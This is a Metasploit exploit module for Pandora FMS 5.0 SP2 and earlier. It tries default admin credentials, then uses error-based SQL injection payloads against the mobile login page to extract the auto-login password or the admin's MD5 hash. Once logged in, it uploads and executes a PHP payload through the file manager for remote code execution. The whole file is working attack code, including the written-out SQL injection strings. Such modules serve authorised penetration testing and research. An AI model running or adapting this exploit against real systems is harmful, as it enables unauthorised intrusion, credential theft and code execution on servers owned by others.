# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Pandora FMS SQLi Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to exploit multiple issues in order to gain remote
        code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt
        to authenticate using default credentials is performed.  If this method
        fails, a SQL injection vulnerability is leveraged in order to extract
        the "Auto Login" password hash.  If this value is not set, the module
        will then extract the administrator account&#039;s MD5 password hash.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Lincoln <Lincoln[at]corelan.be>&#039;, # Discovery, Original Proof of Concept
          &#039;Jason Kratzer <pyoor[at]corelan.be>&#039; # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://pandorafms.com/downloads/whats_new_5-SP3.pdf&#039;],
          [&#039;URL&#039;, &#039;http://blog.pandorafms.org/?p=2041&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Pandora FMS version <= 5.0 SP2&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 50000,
          &#039;DisableNops&#039; => true,
        },
      &#039;DisclosureDate&#039; => "Feb 1 2014",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable Pandora FMS instance&#039;, &#039;/pandora_console/&#039;]),
          OptString.new(&#039;USER&#039;, [false, &#039;The username to authenticate with&#039;, &#039;admin&#039;]),
          OptString.new(&#039;PASS&#039;, [false, &#039;The password to authenticate with&#039;, &#039;pandora&#039;]),
        ], self.class)
  end

  def uri
    target_uri.path
  end


  def check
    vprint_status("#{peer} - Trying to detect installed version")

    version = nil
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;index.php&#039;)
    })

    if res && res.code == 200 && res.body =~ /Pandora FMS - the Flexible Monitoring System/
      if res.body =~ /<div id="ver_num">v(.*?)<\/div>/
        version = $1
      else
        return Exploit::CheckCode::Detected
      end
    end

    unless version.nil?
      vprint_status("#{peer} - Pandora FMS #{version} found")
      if Gem::Version.new(version) <= Gem::Version.new(&#039;5.0SP2&#039;)
        return Exploit::CheckCode::Appears
      end
    end

    Exploit::CheckCode::Safe
  end


  # Attempt to login with credentials (default admin:pandora)
  def authenticate
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;login&#039; => "1",
      },
      &#039;vars_post&#039; => {
        &#039;nick&#039; => datastore[&#039;USER&#039;],
        &#039;pass&#039; => datastore[&#039;PASS&#039;],
        &#039;Login&#039; => &#039;Login&#039;,
      }
    })

    return auth_succeeded?(res)
  end

  # Attempt to login with auto login and SQLi
  def login_hash
    clue = rand_text_alpha(8)
    sql_clue = clue.each_byte.map { |b| b.to_s(16) }.join
    # select value from tconfig where token = &#039;loginhash_pwd&#039;;
    sqli = "1&#039; AND (SELECT 2243 FROM(SELECT COUNT(*),CONCAT(0x#{sql_clue},(SELECT MID((IFNULL(CAST"
    sqli << "(value AS CHAR),0x20)),1,50) FROM tconfig WHERE token = 0x6c6f67696e686173685f707764 "
    sqli << "LIMIT 0,1),0x#{sql_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP "
    sqli << "BY x)a) AND &#039;msf&#039;=&#039;msf"

    password = inject_sql(sqli, clue)

    if password && password.length != 0
      print_status("#{peer} - Extracted auto login password (#{password})")
    else
      print_error("#{peer} - No auto login password has been defined!")
      return false
    end

    print_status("#{peer} - Attempting to authenticate using (admin:#{password})")
    # Attempt to login using login hash password
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;loginhash&#039; => &#039;auto&#039;,
      },
      &#039;vars_post&#039; => {
        &#039;loginhash_data&#039; => Rex::Text.md5("admin#{password}"),
        &#039;loginhash_user&#039; => &#039;admin&#039;,
      }
    })

    return auth_succeeded?(res)
  end


  def auth_succeeded?(res)
    if res && res.code == 200 && res.body.include?(&#039;Welcome to Pandora FMS&#039;)
      print_status("#{peer} - Successfully authenticated!")
      print_status("#{peer} - Attempting to retrieve session cookie")
      @cookie = res.get_cookies
      if @cookie.include?(&#039;PHPSESSID&#039;)
        print_status("#{peer} - Successfully retrieved session cookie: #{@cookie}")
        return true
      else
        print_error("#{peer} - Error retrieving cookie!")
      end
    else
      print_error("#{peer} - Authentication failed!")
    end

    false
  end


  def extract
    # Generate random string and convert to hex
    clue = rand_text_alpha(8)
    hex_clue = clue.each_byte.map { |b| b.to_s(16) }.join

    # select password from tusuario where id_user = 0;
    sqli = "test&#039; AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x#{hex_clue},(SELECT MID((IFNULL"
    sqli << "(CAST(password AS CHAR),0x20)),1,50) FROM tusuario WHERE id_user = 0 LIMIT 0,1)"
    sqli << ",0x#{hex_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY "
    sqli << "x)a) AND &#039;msf&#039;=&#039;msf"

    password = inject_sql(sqli, clue)

    if password && password.length != 0
      print_good("#{peer} - Extracted admin password hash, unsalted md5 - [ #{password} ]")
    else
      print_error("#{peer} - Unable to extract password hash!")
      return false
    end
  end


  def inject_sql(sql, fence_post)
    # Extract password hash from database
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;mobile&#039;, &#039;index.php&#039;),
      &#039;vars_post&#039; => {
        &#039;action&#039; => &#039;login&#039;,
        &#039;user&#039; => sql,
        &#039;password&#039; => &#039;pass&#039;,
        &#039;input&#039; => &#039;Login&#039;
      }
    })

    result = nil
    if res && res.code == 200
      match = res.body.match(/(?<=#{fence_post})(.*)(?=#{fence_post})/)
      if match
        result = match[1]
      else
        print_error("#{peer} - SQL injection failed")
      end
    end
    result
  end

  def upload
    # Extract hash and hash2 from response
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;uri&#039;    => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => {
        &#039;sec&#039; => &#039;gsetup&#039;,
        &#039;sec2&#039; => &#039;godmode/setup/file_manager&#039;
      }
    })

    if res && res.code == 200 && res.body =~ /(?<=input type="submit" id="submit-go")(.*)(?=<input id="hidden-directory" name="directory" type="hidden")/
      form = $1

      # Extract hash
      if form =~ /(?<=name="hash" type="hidden"  value=")(.*?)(?=" \/>)/
        hash = $1
      else
        print_error("#{peer} - Could not extract hash from response!")
        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
      end

      # Extract hash2
      if form =~ /(?<=name="hash2" type="hidden"  value=")(.*?)(?=" \/>)/
        hash2 = $1
      else
        print_error("#{peer} - Could not extract hash2 from response!")
        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
      end

      # Extract real_directory
      if form =~ /(?<=name="real_directory" type="hidden"  value=")(.*?)(" \/>)/
        real_directory = $1
      else
        print_error("#{peer} - Could not extract real_directory from response!")
        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
      end
    else
      print_error("#{peer} - Could not identify upload form!")
      fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
    end


    # Upload script
    @payload_name = "#{rand_text_alpha(8)}.php"
    post_data = Rex::MIME::Message.new
    post_data.add_part("<?php #{payload.encoded} ?>", &#039;text/plain&#039;, nil, %Q^form-data; name="file"; filename="#{@payload_name}"^)
    post_data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="unmask"&#039;)
    post_data.add_part(&#039;Go&#039;, nil, nil, &#039;form-data; name="go"&#039;)
    post_data.add_part(real_directory, nil, nil, &#039;form-data; name="real_directory"&#039;)
    post_data.add_part(&#039;images&#039;, nil, nil, &#039;form-data; name="directory"&#039;)
    post_data.add_part("#{hash}", nil, nil, &#039;form-data; name="hash"&#039;)
    post_data.add_part("#{hash2}", nil, nil, &#039;form-data; name="hash2"&#039;)
    post_data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="upload_file_or_zip"&#039;)

    print_status("#{peer} - Attempting to upload payload #{@payload_name}...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;uri&#039;    => normalize_uri(uri, &#039;index.php&#039;),
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;data&#039; => post_data.to_s,
      &#039;vars_get&#039; => {
        &#039;sec&#039; => &#039;gsetup&#039;,
        &#039;sec2&#039; => &#039;godmode/setup/file_manager&#039;
      }
    })

    if res && res.code == 200 && res.body.include?("Upload correct")
      register_file_for_cleanup(@payload_name)
      print_status("#{peer} - Successfully uploaded payload")
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
    end
  end


  def exploit
    # First try to authenticate using default or user-supplied credentials
    print_status("#{peer} - Attempting to authenticate using (#{datastore[&#039;USER&#039;]}:#{datastore[&#039;PASS&#039;]})")
    auth = authenticate

    unless auth
      print_status("#{peer} - Attempting to extract auto login hash via SQLi")
      auth = login_hash
    end

    unless auth
      print_status("#{peer} - Attempting to extract admin password hash with SQLi")
      extract
      fail_with(Failure::NoAccess, "#{peer} - Unable to perform remote code execution!")
    end

    print_status("#{peer} - Uploading PHP payload...")
    upload

    print_status("#{peer} - Executing payload...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;images&#039;, @payload_name),
      &#039;cookie&#039; => @cookie
    }, 1)
  end
end

